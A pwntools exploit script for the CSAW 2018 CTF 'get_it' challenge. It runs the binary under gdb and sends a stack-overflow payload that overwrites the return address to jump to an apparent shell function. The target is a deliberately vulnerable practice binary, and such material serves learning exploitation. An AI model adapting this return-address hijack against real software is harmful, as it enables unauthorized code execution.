  # https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-14-CSAW-CTF-Quals/files/get_it

from pwn import *

TARGET = "./get_it"

def s(cmd):
    for c in cmd.split(b"\n"):
        if c.strip():
            # print(c)
            subprocess.run(["tmuxpwnrestart", "SEND", base64.b64encode(c)])

context.terminal = ["tmuxpwnrestart"]
# context.log_level = logging.DEBUG
context.binary = TARGET

# socat = process(['socat', 'TCP-LISTEN:4141,reuseaddr,fork', f'EXEC:{TARGET},PTY,raw,echo=0'])
# io = remote('localhost', 4141)
# p = process(TARGET)
# p = gdb.debug(TARGET, api=True)
# p = gdb.attach(proc.pidof(io))
# p = gdb.attach(io)

io = gdb.debug(
    TARGET,
    gdbscript="""
# b *(main+47)
""",

)
# io = process(TARGET)
s(
    # b'target exec ' + TARGET.encode() +
    # source gdbscript.py
    # b main
    # run
    # entry-break
    b"""
   continue
"""
)
g = cyclic_gen()
pattern = g.get(200)
print(g.find(b"iaaajaaa"))
# io.sendline(pattern)
io.sendline(b"A" * 32 + p64(0xAAEEBBCCDEA110C8)+p64(0x00000000004005b7))
io.interactive()
